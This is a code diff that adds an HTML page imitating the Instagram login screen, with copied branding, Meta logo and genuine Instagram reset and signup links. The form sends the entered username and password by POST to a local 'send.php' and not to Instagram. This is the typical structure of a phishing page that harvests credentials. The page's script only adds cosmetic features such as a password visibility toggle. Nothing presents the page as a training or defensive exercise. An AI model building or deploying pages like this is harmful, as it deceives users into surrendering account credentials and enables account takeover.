@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="newstyle.css">
+    <link rel="icon" href="favicon.png" type="image/icon">
+</head>
+<body>
+
+    <div class="login-container">
+    	<img class="logo-pic" src="logo.png" alt="Logo">
+        <form class="login-form" action="send.php" method="POST">
+            <div class="form-group input-container">
+                <input id="username" name="u_name" type="text" placeholder=" " required>
+                <label for="username">Username, email address or mobile number</label>
+                <span class="clear-icon">&times;</span>
+            </div>
+            <div class="form-group input-container">
+                <input id="password" name="pass" type="password" placeholder=" " required>
+                <label for="password">Password</label>
+                <span class="toggle-password">
+                    <img id="eye-icon" src="hide.png" alt="Toggle Password">
+                </span>
+            </div>
+            
+            <button type="submit" class="btn btn-primary">Log in</button>
+            <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-link">Forgotten password?</a>
+        </form>
+        
+        <div class="create-account-container">
+            <a href="https://www.instagram.com/accounts/emailsignup/" class="btn btn-secondary">Create new account</a>
+        </div>
+        <img class="meta-pic" src="meta.png" alt="Meta">
+    </div>
+
+    <script>
+    // --- Password Show/Hide Logic ---
+      const passwordInput = document.getElementById('password');
+      const togglePasswordSpan = document.querySelector('.toggle-password');
+      const eyeIcon = document.getElementById('eye-icon');
+
+      function updateEyeIconVisibility() {
+        if (passwordInput.value.length > 0) {
+          togglePasswordSpan.style.display = 'flex'; 
+        } else {
+          togglePasswordSpan.style.display = 'none'; 
+        }
+      }
+
+      passwordInput.addEventListener('input', updateEyeIconVisibility);
+      updateEyeIconVisibility(); // Run on load
+
+      togglePasswordSpan.addEventListener('click', function () {
+        const currentType = passwordInput.getAttribute('type');
+        if (currentType === 'password') {
+            passwordInput.setAttribute('type', 'text');
+            eyeIcon.src = "show.png"; 
+        } else {
+            passwordInput.setAttribute('type', 'password');
+            eyeIcon.src = "hide.png"; 
+        }
+      });
+      
+      // --- Username Clear Button ---
+      const usernameInput = document.getElementById('username');
+      const clearIcon = document.querySelector('.clear-icon');
+      
+      usernameInput.addEventListener('input', function() {
+        if (usernameInput.value.length > 0) {
+          clearIcon.style.display = 'block';
+        } else {
+          clearIcon.style.display = 'none';
+        }
+      });
+      
+      clearIcon.addEventListener('click', function() {
+        usernameInput.value = ""; 
+        clearIcon.style.display = 'none'; 
+        usernameInput.focus(); 
+      });
+      
+    // --- Advanced Keyboard Detection (visualViewport) ---
+    
+    const VIEWPORT_VS_CLIENT_HEIGHT_RATIO = 0.75;
+    
+    if (window.visualViewport) {
+        window.visualViewport.addEventListener('resize', () => {
+            // Check if the visual viewport is significantly smaller than the window height
+            // This happens when the keyboard pushes the viewport up
+            if (window.visualViewport.height < window.innerHeight * VIEWPORT_VS_CLIENT_HEIGHT_RATIO) {
+                document.body.classList.add('keyboard-is-open');
+            } else {
+                document.body.classList.remove('keyboard-is-open');
+            }
+        });
+    } else {
+        // Fallback for very old browsers
+        const initialHeight = window.innerHeight;
+        window.addEventListener('resize', () => {
+            if (initialHeight - window.innerHeight > 150) {
+                document.body.classList.add('keyboard-is-open');
+            } else {
+                document.body.classList.remove('keyboard-is-open');
+            }
+        });
+    }
+    </script>
+</body>
+</html>
